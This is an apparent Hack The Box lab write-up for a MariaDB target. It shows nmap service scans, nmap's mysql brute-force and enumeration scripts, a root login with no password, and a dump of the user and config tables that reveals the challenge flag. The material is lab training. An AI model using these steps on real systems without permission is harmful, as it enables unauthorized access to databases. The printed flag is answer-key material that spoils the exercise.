Hackthebox
└─# nmap -sV -A -Pn -p- --min-rate 5000 $ip
PORT     STATE SERVICE    VERSION
3306/tcp open  tcpwrapped
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ConnectWithDatabase, Support41Auth, SupportsLoadDataLocal, FoundRows, LongColumnFlag, InteractiveClient, ODBCClient, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: fkc2jBI(-Hc8/#]/nazc
|_  Auth Plugin Name: mysql_native_password
Aggressive OS guesses: HP P2000 G3 NAS device (96%), Linux 5.0 - 5.4 (95%), Linux 5.0 (94%), Linux 5.4 (94%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (94%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (93%), OpenWrt White Russian 0.9 (Linux 2.4.30) (93%), Linux 4.15 - 5.6 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

└─# nmap -p3306 --script=mysql-* $ip 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-14 20:48 EDT
Nmap scan report for 10.129.43.133
Host is up (0.25s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 5 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
| mysql-enum: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 5 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 44
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, ConnectWithDatabase, SupportsCompression, Speaks41ProtocolOld, LongColumnFlag, ODBCClient, InteractiveClient, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Support41Auth, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: -M{E&-M{F,FZsU0.6co(
|_  Auth Plugin Name: mysql_native_password

Now connect 
└─# mysql -u root -p -h $ip
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 58
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

Now i use my sql skills
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (1.408 sec)
now i will switch to the htb database using the use \u
MariaDB [(none)]> \u htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
Then i show the tables
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (1.858 sec)
Then i will display all using
MariaDB [htb]> SELECT * FROM users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.224 sec)
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.209 sec)
